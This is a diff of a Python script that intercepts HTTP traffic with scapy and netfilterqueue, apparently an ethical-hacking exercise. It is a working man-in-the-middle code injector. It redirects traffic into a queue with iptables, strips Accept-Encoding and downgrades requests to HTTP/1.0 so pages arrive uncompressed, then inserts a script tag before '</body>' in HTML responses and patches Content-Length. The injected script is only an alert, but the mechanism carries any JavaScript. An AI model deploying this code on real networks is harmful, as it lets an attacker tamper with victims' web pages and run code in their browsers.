@@ -1,50 +1,42 @@
-import scapy.all as scapy
 import netfilterqueue,subprocess,re
-import scapy_http.http
+from scapy.all import *
 
 def manage_packet(scapy_packet):
-    del scapy_packet[scapy.IP].chksum
-    del scapy_packet[scapy.IP].len
-    del scapy_packet[scapy.TCP].chksum
+    del scapy_packet[IP].chksum
+    del scapy_packet[IP].len
+    del scapy_packet[TCP].chksum
     return scapy_packet
 
 
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy_http.http.HTTPRequest):
-        print("[+] HTTP request")
-    elif scapy_packet.haslayer(scapy_http.http.HTTPResponse):
-        if scapy_packet.haslayer(scapy.Raw): 
-            print(scapy_packet[scapy.Raw].load)   
+def process_packet(packet):  
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(Raw):
+        if scapy_packet.haslayer(TCP):
+            if scapy_packet[TCP].dport == 80:
+                scapy_packet[Raw].load = re.sub(b"Accept-Encoding:.*?\\r\\n",b"",scapy_packet[Raw].load)
+                scapy_packet[Raw].load = re.sub(b"HTTP/1.1",b"HTTP/1.0",scapy_packet[Raw].load)   
+                scapy_packet = manage_packet(scapy_packet)
+                packet.set_payload(bytes(scapy_packet))
 
-
-
-
-
-    # try:
-    #     if scapy_packet.haslayer(scapy_http.http.HTTPRequest):
-    #         if (scapy_packet[scapy.TCP].dport) == 80:
-    #             decoded = scapy_packet[scapy_http.http.HTTPRequest].Headers.decode("utf-8")
-    #             if "Accept-Encoding" in decoded :
-    #                 scapy_packet[scapy_http.http.HTTPRequest].Headers = re.sub("Accept-Encoding:.*?\\r\\n",'',decoded).encode()
-    #                 scapy_packet = manage_packet(scapy_packet)
-    #                 packet.set_payload(str(scapy_packet))
-    #                 print(scapy_packet.show())
-    #     if scapy_packet.haslayer(scapy_http.http.HTTPResponse):
-    #         if (scapy_packet[scapy.TCP].sport) == 80:
-    #             if scapy_packet.haslayer(scapy.Raw):
-    #                 pass
-    # except Exception as e:
-    #     print(e)
-
-
+            elif scapy_packet[TCP].sport ==80:
+                if b"</body>" in scapy_packet[Raw].load:
+                    scapy_packet[Raw].load = scapy_packet[Raw].load.replace(b"</body>",b"</body><script>alert('you are hacked');</script>")
+                contentLength = re.search(b'(?:Content-Length:\s)(\d*)',scapy_packet[Raw].load)
+                if contentLength and (b"text/html" in scapy_packet[Raw].load):
+                    contentLength = contentLength.group(1)
+                    new_contentLength = int(contentLength) + len("<script>alert('you are hacked');</script>")
+                    scapy_packet[Raw].load = scapy_packet[Raw].load.replace(contentLength,(str(new_contentLength)).encode())
+                scapy_packet = manage_packet(scapy_packet)
+                packet.set_payload(bytes(scapy_packet))
+                
+        
     packet.accept()
 
 def main():
 
-    subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1',shell=True)
-    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 2',shell=True)
-    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 2',shell=True)
+    #subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1',shell=True)
+    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1',shell=True)
+    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1',shell=True)
 
 
     print('[+] iptables configured')
